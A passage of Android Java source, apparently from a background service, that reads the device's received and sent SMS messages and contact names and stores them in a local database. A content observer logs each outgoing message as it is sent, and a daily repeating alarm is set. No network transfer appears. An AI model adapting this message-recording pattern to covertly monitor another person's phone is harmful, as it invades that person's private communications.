                    SimpleDateFormat dateForma = new SimpleDateFormat("yyyy-MM-dd");
                    DateFormat time = new SimpleDateFormat("h:mm:ss a");
                    smsDatee = dateForma.format(dateFormat);
                    smsTime = time.format(dateFormat);

                    smsName = getContactName(context, number);
                    smsAddress = number;
                    smsType = type;
                    smsContent = body;

                    dbHandler.onInsertSms(threadId, smsName, smsAddress, smsType, smsContent, smsTime, smsDatee);

                    c.moveToNext();
                }
            }
            c.close();

        }

    }


    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber)), new String[]{"display_name"}, (String) null, (String[]) null, (String) null);
        if (cursor == null) {
            return null;
        }
        String contactName = "Unknown";
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex("display_name"));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }



    protected void getOutgoingSMS() {
//        Log.i(TAG, "called getOutgoingSMS");

        Context context = getApplicationContext();

        Uri uriSMSURI = Uri.parse("content://sms/");
        String selection = "type = '2'"; //Selection parameter to only select messages in sent folder

        Cursor cur = this.getContentResolver().query(uriSMSURI, null, selection,
                null, null);

        // point to the first record (the last SMS message sent)
        cur.moveToNext();

        /* Column headers for content://sms/ table
         * 0: _id
         * 1: thread_id
         * 2: address
         * 3: person
         * 4: date
         * 5: protocol
         * 6: read
         * 7: status
         * 8: type
         * 9: reply_path_present
         * 10: subject
         * 11: body
         * 12: service_center
         * 13: locked
         */

        //Return if mesasge has already been logged, else print to logcat
        String id = cur.getString(cur.getColumnIndex("_id"));
        if (id.equals(lastSmsId)){
          //  Log.i(TAG, "message already logged, returning");
            return;
        }
        else {
            String address = cur.getString(cur.getColumnIndex("address"));
            String name = cur.getString(cur.getColumnIndex("person"));
            String date = cur.getString(cur.getColumnIndex("date"));
            String msg = cur.getString(cur.getColumnIndex("body"));
            String status = cur.getString(cur.getColumnIndex("type"));
            threadId = cur.getString(cur.getColumnIndex("thread_id"));

            Date dateFormat= new Date(Long.valueOf(date));


            DateFormat dateForma = new SimpleDateFormat("yyyy-MM-dd");
            DateFormat time= new SimpleDateFormat("h:mm:ss a");

            smsName = getContactName(context.getApplicationContext(), address);
            smsAddress = address;
            smsDatee=dateForma.format(dateFormat);
            smsTime=time.format(dateFormat);
            smsContent = msg;
            smsType="sent";
//
//            Log.i(TAG, "NEW OUTGOING SMS MESSAGE");
//            Log.i(TAG, "Address: " + smsAddress);
//            Log.i(TAG, "Name: " + smsName);
//            Log.i(TAG, "date: " + smsDatee);
//            Log.i(TAG, "time: " + smsTime);
//            Log.i(TAG, "msg: " + smsContent);
    //        Log.i(TAG, "...........................status: " +threadId);
////

            dbHandler.onInsertSms(threadId,smsName, smsAddress, smsType,smsContent,smsTime,smsDatee);



            // update the last SMS id
            lastSmsId = id;
        }
    }

    class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        /*
         * Called when content://sms/ changes This method is often called
         * multiple times when a single sms message is sent
         */
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
    //        Log.i(TAG, "SMS content changed");
            getOutgoingSMS();
        }
    }

    private void setAlarm(long time) {
        //getting the alarm manager
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        //creating a new intent specifying the broadcast receiver
        Intent i = new Intent(this, myAlerm.class);

        //creating a pending intent using the intent
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);

        //setting the repeating alarm that will be fired every day
        am.setRepeating(AlarmManager.RTC, time, AlarmManager.INTERVAL_DAY, pi);
        Toast.makeText(this, "Alarm is set"+time, Toast.LENGTH_SHORT).show();
    }




}







